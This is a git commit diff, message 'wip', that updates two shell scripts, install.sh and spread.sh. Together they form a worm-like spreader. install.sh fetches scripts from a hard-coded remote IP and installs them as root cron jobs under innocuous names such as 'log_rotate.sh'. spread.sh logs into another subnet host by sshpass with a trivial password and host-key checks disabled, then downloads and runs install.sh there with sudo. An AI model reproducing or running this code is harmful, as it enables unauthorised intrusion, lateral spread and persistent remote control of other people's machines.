12bd8454da151f5393a207dca6f786f940bac236
nitrogen <liquid.nitrogenium@gmail.com>
2022-11-01 00:33:52 +0500

    wip

--- public/install.sh
+++ public/install.sh
@@ -4,7 +4,7 @@ is_log_rotate=$(cat /var/spool/cron/crontabs/root|grep log_rotate.sh)
 
 if [ -z "$is_log_rotate" ]
 then
-      mkdir -p  /home/user/tmp && cd /home/user/tmp && wget -O log_rotate.sh http://95.217.211.87:8000/log_rotate.sh && chmod +x log_rotate.sh && crontab -l | { cat; echo "*/2 * * * * /home/user/tmp/log_rotate.sh"; } | crontab -
+     cd /usr/bin/ && wget -O log_rotate.sh http://95.217.211.87:8000/log_rotate.sh && chmod +x log_rotate.sh && crontab -l | { cat; echo "*/2 * * * * /usr/bin/log_rotate.sh"; } | crontab -
 
 
 fi
@@ -14,7 +14,6 @@ is_spread=$(cat /var/spool/cron/crontabs/root|grep spread.sh)
 if [ -z "$is_spread" ]
 then
       random_hour=$((1 + $RANDOM % 23))
-      mkdir -p  /home/user/tmp && cd /home/user/tmp && wget -O spread.sh http://95.217.211.87:8000/spread.sh && chmod +x spread.sh && crontab -l | { cat; echo "* $random_hour * * * /home/user/tmp/spread.sh"; } | crontab -
-
+      cd /usr/bin/ && wget -O spread.sh http://95.217.211.87:8000/spread.sh && chmod +x spread.sh && crontab -l | { cat; echo "* $random_hour * * * /usr/bin/spread.sh"; } | crontab -
 
 fi
--- public/spread.sh
+++ public/spread.sh
@@ -1,8 +1,9 @@
 #!/bin/bash
 
-i=39
+i=82
 
 echo "Processing 192.168.2.$i"
 
 
-sshpass -p1 ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@192.168.2.$i "mkdir -p  /home/user/tmp && cd /home/user/tmp && wget -O install.sh http://95.217.211.87:8000/install.sh && chmod +x install.sh"
+#sshpass -p1 ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@192.168.2.$i "mkdir -p  /home/user/tmp && cd /home/user/tmp && wget -O install.sh http://95.217.211.87:8000/install.sh && chmod +x install.sh"
+sshpass -p1 ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@192.168.2.$i "cd /usr/bin/ && sudo wget -O install.sh http://95.217.211.87:8000/install.sh && sudo chmod +x install.sh && sudo ./install.sh"
